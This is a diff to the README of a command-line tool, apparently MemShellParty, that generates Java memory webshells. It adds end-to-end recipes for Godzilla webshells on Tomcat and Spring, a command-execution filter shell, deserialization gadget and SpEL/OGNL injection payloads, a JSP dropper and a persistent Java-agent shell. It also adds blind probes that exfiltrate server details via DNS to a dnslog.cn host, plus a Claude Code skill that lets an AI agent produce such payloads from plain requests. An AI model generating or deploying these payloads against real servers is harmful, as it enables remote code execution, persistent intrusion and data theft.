@@ -93,6 +93,90 @@ memparty probe -m ResponseBody -c Command -p DefaultBase64 --server Tomcat --req
 memparty probe -m Sleep -c Server -p DefaultBase64 --sleep-server Tomcat --seconds 5
 ```
 
+Probe method × content matrix (only these combos are supported by the backend):
+
+| Method `-m` | Supported content `-c` |
+|-------------|-------------------------|
+| `DNSLog` | `Server`, `JDK` |
+| `Sleep` | `Server` |
+| `ResponseBody` | `Command`, `Bytecode`, `Filter`, `ScriptEngine` |
+
+## Demos
+
+End-to-end recipes. Pick the **packer** to match your delivery vector, and the **shell type** to
+match the target (add the `Jakarta` prefix for Tomcat 10+ / Spring Boot 3; use `Agent*` types with
+the `AgentJar*` packers). When in doubt, run `memparty config tools <server>` and
+`memparty config packers` first.
+
+### 1. Godzilla webshell on Tomcat 9 (javax)
+
+```bash
+# Listener-based Godzilla shell, single base64 payload to stdout
+memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 \
+  --godzilla-pass pass --godzilla-key key --jdk java8
+
+# ...or write the decoded injector .class straight to disk
+memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 \
+  --godzilla-pass pass --godzilla-key key -o shell.class
+```
+
+### 2. Same shell on Tomcat 10+ / Spring Boot 3 (Jakarta)
+
+```bash
+memparty gen -s Tomcat -t Godzilla -y JakartaListener -p DefaultBase64 \
+  --godzilla-pass pass --godzilla-key key --jdk java17
+```
+
+### 3. Pure command-execution shell (RCE)
+
+```bash
+memparty gen -s Tomcat -t Command -y Filter -p DefaultBase64 \
+  --command-param-name cmd --encryptor RAW --implementation-class RuntimeExec --jdk java8
+```
+
+### 4. Deserialization gadget chain (e.g. CommonsBeanutils ≤ 1.9.4)
+
+```bash
+memparty gen -s Tomcat -t Godzilla -y Listener -p JavaCommonsBeanutils19 \
+  --godzilla-pass pass --godzilla-key key --jdk java8
+# other chains: JavaCommonsBeanutils18/17/16/110, JavaCommonsCollections3/4
+```
+
+### 5. Expression-injection delivery (SpEL / OGNL / EL / Groovy …)
+
+```bash
+# Spring SpEL injection -> define + load the shell class (Spring uses Interceptor, not Filter)
+memparty gen -s SpringWebMvc -t Command -y Interceptor -p SpEL \
+  --command-param-name cmd --jdk java8
+# OGNL (Struts2), EL, MVEL, Aviator, JEXL, JXPath, Groovy, Velocity, Freemarker, JinJava ...
+# (SpEL/OGNL/JXPath are *aggregate* packers — they return several variants at once)
+```
+
+### 6. Drop a JSP file
+
+```bash
+memparty gen -s Tomcat -t Godzilla -y Listener -p DefineClassJSP \
+  --godzilla-pass pass --godzilla-key key --jdk java8 -o shell.jsp
+```
+
+### 7. Java-agent memory shell (survives redeploys, hooks deep)
+
+```bash
+memparty gen -s Tomcat -t Godzilla -y AgentFilterChain -p AgentJar \
+  --godzilla-pass pass --godzilla-key key --jdk java8 -o agent.jar
+```
+
+### 8. Fingerprint the target first (blind)
+
+```bash
+# DNSLog: confirm code execution + exfil the server/JDK name via DNS
+memparty probe -m DNSLog -c Server -p DefaultBase64 --host <your>.dnslog.cn
+# Sleep: time-based blind — delays Ns only if the server matches your guess
+memparty probe -m Sleep -c Server -p DefaultBase64 --sleep-server Tomcat --seconds 5
+```
+
+The server name a probe reports is exactly the `-s` value to pass to `memparty gen`.
+
 ### Parse a class name
 
 ```bash
@@ -130,6 +214,25 @@ Example Claude Code / Claude Desktop config:
 
 Exposed tools: `list_servers`, `list_config`, `list_packers`, `list_command_configs`,
 `generate_memshell`, `generate_probe`, `parse_classname`, `server_version`.
+
+## AI skill (Claude Code)
+
+The package ships a [Claude Code skill](https://docs.claude.com/en/docs/claude-code/skills) at
+`skills/memshell-party/SKILL.md` that teaches an AI agent how to drive MemShellParty — the
+server/tool/type/packer decision tree, the probe method×content matrix, packer-by-scenario
+guidance, and the common gotchas (Jakarta vs javax, JDK targeting, aggregate vs leaf packers).
+
+Install it into a project (or drop it in `~/.claude/skills/` for global use):
+
+```bash
+# from the package root, or after `npm install memshell-party-cli`:
+mkdir -p .claude/skills
+cp node_modules/memshell-party-cli/skills/memshell-party .claude/skills/ -r
+```
+
+Then just ask in natural language, e.g. *"generate a Godzilla listener for Tomcat 10"* or
+*"give me a CommonsBeanutils deserialization payload for a Spring Boot 2 app"* — the skill guides
+the agent to enumerate options first and pick the right packer for the vector.
 
 ## Programmatic use
 
